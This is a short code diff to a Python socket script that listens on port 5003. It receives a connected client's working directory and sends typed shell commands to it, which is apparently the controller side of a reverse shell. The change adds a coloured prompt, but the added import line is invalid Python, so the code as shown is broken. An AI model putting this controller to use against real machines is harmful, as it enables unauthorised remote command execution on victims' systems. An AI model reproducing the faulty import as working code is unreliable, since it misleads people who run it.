@@ -4,6 +4,7 @@
 # Description: This script will listen server host 0.0.0.0 port 5003
 
 import socket
+import termcolor import colored
 
 SERVER_HOST = "0.0.0.0"
 SERVER_PORT = 5003
@@ -24,7 +25,7 @@ cwd = client_socket.recv(BUFFER_SIZE).decode()
 print(f'[+] Current working directory: {cwd}')
 
 while True:
-    command = input('f{cwd} $> ')
+    command = input(colored(f'{cwd} $ ', 'red'))
     if not command.strip():
         continue
     client_socket.send(command.encode())
